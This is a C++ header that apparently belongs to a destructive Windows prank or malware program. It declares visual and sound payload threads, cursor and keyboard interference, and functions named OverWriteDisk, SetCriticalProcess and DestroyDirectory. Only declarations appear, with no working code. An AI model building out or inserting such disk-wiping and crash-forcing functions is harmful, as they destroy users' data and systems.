#pragma once
#include <Windows.h>
#include <math.h>
#include <thread>
#include <AclAPI.h>
#include <winternl.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "Netapi32.lib")
extern DWORD WINAPI Payload1(LPVOID lpParam);
extern DWORD WINAPI Payload2(LPVOID lpParam);
extern DWORD WINAPI Payload3(LPVOID lpParam);
extern DWORD WINAPI Payload4(LPVOID lpParam);
extern DWORD WINAPI Payload5(LPVOID lpParam);
extern DWORD WINAPI shake(LPVOID lpParam);
extern DWORD WINAPI sound1(LPVOID lpParam);
extern DWORD WINAPI CubeThread(LPVOID lpParam);
extern DWORD WINAPI StartBubbles(LPVOID lpParam);
extern DWORD WINAPI sound2(LPVOID lpParam);
extern DWORD WINAPI squares(LPVOID lpParam);
extern DWORD WINAPI Cursor(LPVOID lpParam);
extern DWORD WINAPI Keyboard(LPVOID lpParam);
extern DWORD WINAPI dark(LPVOID lpstart);
DWORD WINAPI extreme(LPVOID lpParam);
extern DWORD WINAPI Colours1(LPVOID lpParam);
extern DWORD WINAPI Colours2(LPVOID lpParam);
extern DWORD WINAPI Colours3(LPVOID lpParam);
COLORREF Hue(int length);
void OverWriteDisk();
#pragma comment(lib,"ntdll.lib")
extern void SetCriticalProcess();
extern void DestroyDirectory(LPWSTR Directory);